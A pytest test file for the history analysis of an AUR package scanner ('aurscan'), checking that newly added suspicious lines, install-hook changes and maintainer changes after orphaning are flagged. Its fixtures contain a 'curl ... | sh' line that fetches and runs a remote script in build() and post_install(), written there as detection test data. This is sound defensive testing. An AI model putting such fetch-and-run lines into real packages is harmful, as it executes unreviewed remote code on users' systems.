"""History analysis tests. All repositories are local and created in tmp_path."""

from __future__ import annotations

import subprocess
from pathlib import Path

import pytest

import aurscan.history as history
from aurscan.errors import CloneError, HistoryError
from aurscan.history import (
    Commit,
    clone_history,
    diff_findings,
    maintainer_change_findings,
)
from aurscan.models import Severity
from aurscan.rules import registry
from tests.rules_utils import by_rule, make_meta

BENIGN_PKGBUILD = """\
pkgname=demo
pkgver=1.0
pkgrel=1
arch=('x86_64')
url="https://example.invalid/demo"

build() {
  cd "$srcdir/demo-$pkgver"
  make
}
"""

PIPE_PKGBUILD = """\
pkgname=demo
pkgver=1.0
pkgrel=1
arch=('x86_64')
url="https://example.invalid/demo"

build() {
  cd "$srcdir/demo-$pkgver"
  curl -s https://example.invalid/x.sh | sh
  make
}
"""

BENIGN_INSTALL = """\
post_install() {
  echo "installed"
}
"""

PIPE_INSTALL = """\
post_install() {
  curl -s https://example.invalid/x.sh | sh
}
"""


def _git(repo: Path, *args: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["git", *args],
        cwd=repo,
        check=True,
        capture_output=True,
        text=True,
    )


def _init_repo(repo: Path) -> None:
    repo.mkdir()
    _git(repo, "init", "-b", "main")
    _git(repo, "config", "user.name", "Committer")
    _git(repo, "config", "user.email", "committer@example.invalid")


def _commit(repo: Path, message: str, author: str) -> None:
    slug = author.lower().replace(" ", ".")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-m", message, "--author", f"{author} <{slug}@example.invalid>")


def _write(repo: Path, name: str, content: str) -> None:
    target = repo / name
    target.parent.mkdir(parents=True, exist_ok=True)
    target.write_text(content, encoding="utf-8")


def test_clone_history_returns_recent_commits_newest_first(tmp_path: Path) -> None:
    repo = tmp_path / "source"
    _init_repo(repo)
    _write(repo, "PKGBUILD", BENIGN_PKGBUILD)
    _commit(repo, "initial", "Alice")

    for index in range(1, 5):
        _write(repo, "notes.txt", f"change {index}\n")
        _commit(repo, f"change {index}", "Alice")

    commits = clone_history("demo", n=3, _git_url=repo.as_uri())

    assert [commit.message for commit in commits] == ["change 4", "change 3", "change 2"]
    assert commits[0].date.tzinfo is not None
    assert commits[0].author == "Alice"
    assert "notes.txt" in commits[0].files
    assert "PKGBUILD" in commits[0].tree_files
    # The oldest returned commit was diffed against the extra fetched parent.
    assert commits[-1].added_lines


def test_diff_findings_flags_curl_pipe_added_in_second_commit(tmp_path: Path) -> None:
    repo = tmp_path / "source"
    _init_repo(repo)
    _write(repo, "PKGBUILD", BENIGN_PKGBUILD)
    _commit(repo, "initial", "Alice")
    _write(repo, "PKGBUILD", PIPE_PKGBUILD)
    _commit(repo, "add update step", "Bob")

    commits = clone_history("demo", _git_url=repo.as_uri())
    findings = diff_findings(commits, registry)

    assert len(commits) == 2
    assert commits[0].author == "Bob"
    r01 = by_rule(findings, "R01")
    assert len(r01) == 1
    finding = r01[0]
    assert finding.severity == Severity.HIGH
    assert finding.source == "history"
    assert finding.file == "PKGBUILD"
    assert finding.message.startswith(f"new in commit {commits[0].short_hash}:")
    assert "curl" in (finding.snippet or "")
    # The first commit introduced no finding, so it stays silent.
    assert diff_findings([commits[1]], registry) == []


def test_diff_findings_ignores_preexisting_suspicious_lines(tmp_path: Path) -> None:
    repo = tmp_path / "source"
    _init_repo(repo)
    _write(repo, "PKGBUILD", PIPE_PKGBUILD)
    _commit(repo, "initial", "Alice")
    _write(repo, "PKGBUILD", PIPE_PKGBUILD.replace("pkgver=1.0", "pkgver=1.1"))
    _commit(repo, "bump version", "Bob")

    findings = diff_findings(clone_history("demo", _git_url=repo.as_uri()), registry)

    assert not by_rule(findings, "R01")


def test_diff_findings_flags_install_hook_changes(tmp_path: Path) -> None:
    repo = tmp_path / "source"
    _init_repo(repo)
    _write(repo, "PKGBUILD", BENIGN_PKGBUILD)
    _write(repo, "demo.install", BENIGN_INSTALL)
    _commit(repo, "initial", "Alice")
    _write(repo, "demo.install", PIPE_INSTALL)
    _commit(repo, "update hook", "Bob")

    findings = diff_findings(clone_history("demo", _git_url=repo.as_uri()), registry)

    r11 = by_rule(findings, "R11")
    assert len(r11) == 1
    assert r11[0].source == "history"
    assert r11[0].file == "demo.install"
    assert r11[0].message.startswith("new in commit ")


def test_maintainer_change_after_orphan_fires_m01(tmp_path: Path) -> None:
    repo = tmp_path / "source"
    _init_repo(repo)
    _write(repo, "PKGBUILD", BENIGN_PKGBUILD)
    _commit(repo, "initial", "Alice")
    _write(repo, "PKGBUILD", PIPE_PKGBUILD)
    _commit(repo, "update", "Bob")

    commits = clone_history("demo", _git_url=repo.as_uri())
    findings = maintainer_change_findings(commits, make_meta(maintainer=None))

    assert len(findings) == 1
    assert findings[0].rule_id == "M01"
    assert findings[0].severity == Severity.MEDIUM
    assert findings[0].source == "history"


def test_maintainer_change_requires_orphan_and_author_change(tmp_path: Path) -> None:
    repo = tmp_path / "source"
    _init_repo(repo)
    _write(repo, "PKGBUILD", BENIGN_PKGBUILD)
    _commit(repo, "initial", "Alice")
    _write(repo, "PKGBUILD", PIPE_PKGBUILD)
    _commit(repo, "update", "Bob")

    commits = clone_history("demo", _git_url=repo.as_uri())

    assert maintainer_change_findings(commits, make_meta(maintainer="Bob")) == []
    commits[0] = Commit(**{**commits[0].model_dump(), "author": "Alice"})
    assert maintainer_change_findings(commits, make_meta(maintainer=None)) == []


def test_clone_history_failure_raises_history_error(tmp_path: Path) -> None:
    with pytest.raises(HistoryError, match="could not clone history"):
        clone_history("demo", _git_url=(tmp_path / "missing").as_uri())


def test_clone_history_forwards_timeout_to_clone(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    captured: dict[str, object] = {}

    def fake_clone(
        _name: str,
        _dest: object,
        *,
        timeout: float = 0.0,
        url: str | None = None,
        depth: int = 1,
    ) -> None:
        captured["timeout"] = timeout
        captured["url"] = url
        captured["depth"] = depth
        raise CloneError("stop")

    monkeypatch.setattr(history, "clone_package", fake_clone)

    with pytest.raises(HistoryError, match="could not clone history"):
        clone_history("demo", timeout=7.5)

    assert captured == {"timeout": 7.5, "url": None, "depth": 11}
